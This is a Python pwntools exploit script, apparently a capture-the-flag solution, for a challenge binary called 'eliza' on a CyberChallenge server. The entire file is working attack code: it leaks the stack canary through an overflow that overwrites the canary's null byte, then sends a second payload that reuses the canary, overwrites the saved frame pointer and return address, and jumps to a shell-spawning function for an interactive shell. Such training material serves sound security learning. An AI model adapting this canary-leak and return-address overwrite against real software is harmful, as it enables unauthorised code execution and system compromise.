#!/usr/bin/env python3

from pwn import *
import re


exe = ELF("./eliza")

context.binary = exe


PADDING = b'A' * 72     # Found in decompiled code


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r)
    else:
        r = remote("eliza.challs.cyberchallenge.it", 9131)

    return r


def leak_canary() -> bytes:

    # Overwrite canary NULL byte with '@' so we can read the canary value (serves as a "flag" as well)
    payload = PADDING + b'@'

    r.sendafter("anything...\n", payload)
    output = r.recvline()

    # Split the output in 2 byte strings and read 7 bytes from the second one (which are the canary bytes!)
    canary = output.split(b'@')[1][:7]      # NOTE: the first byte is NULL and we overwrite it
    canary = b'\x00' + canary

    # A little bit of logging (it looks cool too :D)
    log.warn(f'Leaked canary value (Big-Endian): 0x{canary.hex()}')

    return canary


def main():
    r = conn()

    canary = leak_canary()    
    sp4wn_4_sh311 = exe.symbols['sp4wn_4_sh311']

    payload =  PADDING
    payload += canary                   # Reuse the leaked canary to bypass the stack smash check
    payload += p64(0x4142434441424344)  # Overwrite RBP saved in stack
    payload += p64(sp4wn_4_sh311)       # Function (not) used in the binary to spawn a shell (overwrites RIP in stack)

    r.sendafter("anything...\n", payload)
    r.interactive()


if __name__ == "__main__":
    main()
